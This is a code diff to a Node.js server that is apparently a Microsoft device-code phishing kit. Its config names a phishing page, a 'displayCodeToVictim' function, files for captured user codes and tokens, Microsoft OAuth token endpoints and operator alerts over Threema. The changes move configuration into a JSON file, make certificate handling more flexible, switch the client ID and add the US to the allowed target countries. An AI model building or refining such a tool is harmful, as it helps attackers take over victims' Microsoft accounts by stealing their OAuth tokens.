@@ -4,34 +4,47 @@ import cookies from 'cookie-parser';
 import fs from 'fs';
 import https from 'https';
 import http from 'http';
+import path from 'path';
+import { fileURLToPath } from 'url';
 import geoip from 'geoip-country';
 
-const config = {
+const __dirname = path.dirname(fileURLToPath(import.meta.url));
+const configPath = path.join(__dirname, 'config.json');
+
+const defaultConfig = {
     httpPort: 80,
     httpsPort: 443,
-    testMode: false,
-    debug: false,
-    clientId: 'b26aadf8-566f-4478-926f-589f601d9c74', // This default ID is from MS Office
-    tokenUrl: 'https://login.microsoftonline.com/Common/oauth2/v2.0/token',
-    deviceCodeUrl: 'https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
-    scopes: 'offline_access openid',
-    phishingHTML: 'index.html',
-    redirectUrl: 'https://http.cat',
-    alreadyLoggedInURL: 'https://onedriveURLwithContentOrSomethingElse',
+    testMode: true,
+    debug: true,
+    clientId: "d3590ed6-52b3-4102-aeff-aad2292ab01c", // MS public client ID
+    tokenUrl: "https://login.microsoftonline.com/Common/oauth2/v2.0/token",
+    deviceCodeUrl: "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode",
+    scopes: "offline_access openid",
+    phishingHTML: "index.html",
+    redirectUrl: "https://http.cat",
+    alreadyLoggedInURL: "https://onedriveURLwithContentOrSomethingElse",
     cookieExpirationInDays: 90,
-    userCodesFile: 'successful_user_code_cookies.txt',
-    logFile: 'logfile.txt',
-    tokenFile: 'tokens.txt',
+    userCodesFile: "successful_user_code_cookies.txt",
+    logFile: "logfile.txt",
+    tokenFile: "tokens.txt",
     threemaOn: false,
-    threemaTo: ['YourID1', 'YourID2'],
-    threemaFrom: 'YourName',
-    threemaURL: 'https://msgapi.threema.ch/send_simple',
-    threemaSecret: 'PutYourSecretHere',
-    keyFilePath: '/etc/letsencrypt/live/{path}/privkey.pem',
-    certFilePath: '/etc/letsencrypt/live/{path}/cert.pem',
-    caFilePath: '/etc/letsencrypt/live/{path}/fullchain.pem',
-    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
-    geoipallowlist: ['CH']
+    threemaTo: ["YourID1","YourID2"],
+    threemaFrom: "YourName",
+    threemaURL: "https://msgapi.threema.ch/send_simple",
+    threemaSecret: "PutYourSecretHere",
+    keyFilePath: "./certs/privkey.pem",
+    certFilePath: "./certs/cert.pem",
+    caFilePath: "./certs/origin-ca.pem",
+    userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
+    geoipallowlist: ["CH","US"],
+};
+
+const config = fs.existsSync(configPath)
+    ? JSON.parse(fs.readFileSync(configPath, 'utf8'))
+    : defaultConfig;
+
+function resolveCertPath(certPath) {
+    return path.isAbsolute(certPath) ? certPath : path.join(__dirname, certPath);
 }
 
 function displayCodeToVictim(res, userCode) {
@@ -238,13 +251,15 @@ if (config.testMode) {
         logMessage('App listening on port ' + config.httpPort);
     });
 } else {
-    https.createServer({
-        key: fs.readFileSync(config.keyFilePath),
-        cert: fs.readFileSync(config.certFilePath),
-        ca: fs.readFileSync(config.caFilePath),
-    },
-        app
-    ).listen(config.httpsPort, () => {
+    const tlsOptions = {
+        key: fs.readFileSync(resolveCertPath(config.keyFilePath)),
+        cert: fs.readFileSync(resolveCertPath(config.certFilePath)),
+    };
+    const caPath = resolveCertPath(config.caFilePath);
+    if (config.caFilePath && fs.existsSync(caPath)) {
+        tlsOptions.ca = fs.readFileSync(caPath);
+    }
+    https.createServer(tlsOptions, app).listen(config.httpsPort, () => {
         logMessage('App listening on port ' + config.httpsPort);
     });
 }
